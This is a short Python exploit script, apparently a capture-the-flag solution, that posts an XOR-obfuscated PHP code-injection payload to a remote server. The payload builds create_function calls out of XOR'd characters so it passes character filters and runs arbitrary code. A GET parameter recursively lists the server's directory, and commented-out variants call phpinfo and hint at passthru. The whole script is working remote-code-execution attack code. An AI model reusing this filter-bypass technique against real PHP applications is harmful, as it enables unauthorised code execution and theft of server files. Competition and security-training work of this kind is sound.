import requests
# read dir
payload_get = "?_=$a=new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$a->rewind();print_r(iterator_to_array($a));"
# payload_get = "?_=phpinfo();"
# read flag
# payload_get = "?_=echo create_function('','return 1;');"

# actual payload print_r(create_function('reset($_GET);'));
data = {"cmd": "(('.'^'^').(','^'^').((('='^'^')^'$')^'.').((('='^'^')^'$')^')').((('='^'^')^',')^(';')).'_'.(','^'^'))((((('='^'^')^'$')^'$').(','^'^').(';'^'^').((('='^'^')^'$')^(((('='^'^')^'.')^((('='^'^')^'$')^',')))).((('='^'^')^',')^(';')).(';'^'^').'_'.((('='^'^')^')')^(',')).((('='^'^')^',')^(((('='^'^')^'$')^'}'))).((('='^'^')^'$')^')').((('='^'^')^'$')^'$').((('='^'^')^',')^(';')).((('='^'^')^'$')^'.').((('='^'^')^'$')^'(').((('='^'^')^'$')^')'))('',((','^'^').(';'^'^').((('='^'^')^',')^((('='^'^')^'_'))).(';'^'^').((('='^'^')^',')^(';')))(${'_'.(('='^'^')^'$').(((('='^'^')^'$')^(((('='^'^')^'.')^((('='^'^')^'$')^','))))^('$')).(((('='^'^')^'$')^(((('='^'^')^')')^(';'^'^'))))^((('='^'^')^'_')))}))());".replace(" ","")}
# data = {"cmd": "phpinfo();"}
# d = requests.post("http://localhost:8080/SOAL/slashroot6/test.php"+payload_get,data=data).text
# data = {"cmd": "echo;"}

d = requests.post(f"http://103.152.242.37:21203{payload_get}",data=data).text
# d = requests.post(f"http://localhost:21203/index.php",data=data).text

# phpinfo
# data = {"cmd": "(('.'^'^').(','^'^').((('='^'^')^'$')^'.').((('='^'^')^'$')^')').((('='^'^')^',')^(';')).'_'.(','^'^'))((('.'^'^').((('='^'^')^'$')^(((('='^'^')^')')^(';'^'^')))).('.'^'^').((('='^'^')^'$')^'.').((('='^'^')^'$')^')').((('='^'^')^')')^(',')).((('='^'^')^'$')^'('))());"}
# d = requests.post("http://172.24.25.129:5000/index.php"+payload_get,data=data).text

# passthru

print(d)
# open("test.html",'w').write(d)
